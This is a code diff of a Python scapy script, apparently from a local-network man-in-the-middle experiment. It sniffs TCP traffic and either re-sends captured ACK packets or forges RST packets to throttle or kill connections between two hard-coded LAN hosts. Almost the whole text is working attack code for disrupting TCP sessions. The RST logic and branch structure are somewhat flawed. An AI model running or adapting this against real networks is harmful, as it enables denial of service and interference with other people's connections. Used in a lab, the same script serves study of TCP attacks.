@@ -17,36 +17,43 @@ from scapy.all import *
 
 def throttleTCP(sourceIP, destIp, throttle):
     if throttle == "dublicateACK":
-        print("dublicateACK")
+        sniff(prn=retransmit_ack, count=1000) 
     if throttle == "RST":
-        print("RST")
+        sniff(prn=rst, count=1000) 
     else:
         print("Select either 'dublicateACK' or 'RST' as throttle method.")
         
-# throttleTCP("localhost", "localhost", "RST")
-
 usedAcks = set()
-attackedIp = "192.168.0.177"
-mitmIp = "192.168.0.192"
 
 def retransmit_ack(packet):
     if packet.haslayer(TCP) and packet[TCP].flags == "A":  # Checking for ACK flag
-        print(f"Captured new ACK Packet: {packet.summary()} with number {packet[TCP].ack}")
+        print(f"Captured ACK Packet: {packet.summary()} with number {packet[TCP].ack}")
         incomingAck = packet[TCP].ack
         if incomingAck not in usedAcks:
             print(f"Captured new ACK Packet: {packet.summary()}")
             print(f"Ack is: {incomingAck}")
             usedAcks.add(incomingAck)
             new_packet = packet.copy()
-            new_packet[IP].dst = attackedIp
-            new_packet[IP].src = attackedIp
             del new_packet[IP].chksum
             del new_packet[TCP].chksum
             sendp(new_packet, iface="enp3s0", count=3, inter=0.0)  
             print("Retransmitted ACK Packet.")
 
+def rst(packet):
+    if packet.haslayer(TCP):
+        print(f"sourceIp is: {packet[IP].src}. dstIp is: {packet[IP].dst}.")
+        rst_packet = IP(src=packet[IP].src, dst=packet[IP].dst) / TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, flags="R", seq=packet[TCP].seq, ack=packet[TCP].ack)
+        sendp(rst_packet, iface="enp3s0")
+
 def main():
-    sniff(prn=retransmit_ack, count=1000000) 
+    sourceIp = "192.168.0.177"
+    dstIp = "192.168.0.192"
+
+    #attackedIp = input("sourceIp: ")
+    #mitmIp = input("dstIp: ")
+    #throttle = input("throttle: ")
+    throttleTCP(sourceIp, dstIp, "dublicateACK")
+    #throttleTCP(sourceIp, dstIp, "RST")
 
 if __name__=="__main__":
     main()
